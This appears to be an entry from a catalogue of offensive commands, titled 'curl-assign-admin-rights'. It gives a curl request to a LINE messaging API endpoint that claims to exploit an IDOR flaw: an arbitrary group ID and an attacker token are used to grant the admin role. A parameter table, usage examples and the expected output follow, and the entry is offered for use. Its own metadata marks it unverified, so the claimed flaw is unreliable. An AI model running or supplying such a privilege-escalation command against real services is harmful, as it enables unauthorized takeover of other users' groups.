---
data: >-
  curl -X POST
  "https://api.line.me/v2/bot/group/{target_group_id}/members/permissions" -H
  "Content-Type: application/json" -H "Authorization: Bearer {attacker_token}"
  -d '{"role": "admin"}'
tags:
  - web
  - exploit
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 98de4881-f7a2-434c-9f1d-82624f6699dd
created_at: '2025-12-14T17:30:58.607Z'
updated_at: '2025-12-14T17:30:58.607Z'
verified: false
validated: true
submitted: true
---
# curl-assign-admin-rights

## Command

```bash
curl -X POST "https://api.line.me/v2/bot/group/{target_group_id}/members/permissions" -H "Content-Type: application/json" -H "Authorization: Bearer {attacker_token}" -d '{"role": "admin"}'
```

## Description

This command sends a POST request to assign admin role via LINE's API, exploiting IDOR by using an arbitrary group ID for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{target_group_id}` | The target group ID to assign rights to | Yes |
| `{attacker_token}` | Attacker's access token | No (if unauthenticated) |
| `{"role": "admin"}` | JSON payload specifying the role | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.line.me/v2/bot/group/1234567890abcdef/members/permissions" -H "Content-Type: application/json" -d '{"role": "admin"}'
```

### Advanced Usage

```bash
curl -X GET "https://api.line.me/v2/bot/group/1234567890abcdef/members/admins" -H "Authorization: Bearer xyz789"
```

## Expected Output

HTTP 200 OK with {"role": "admin"} on success.

## Related

- [[Related Procedure]]
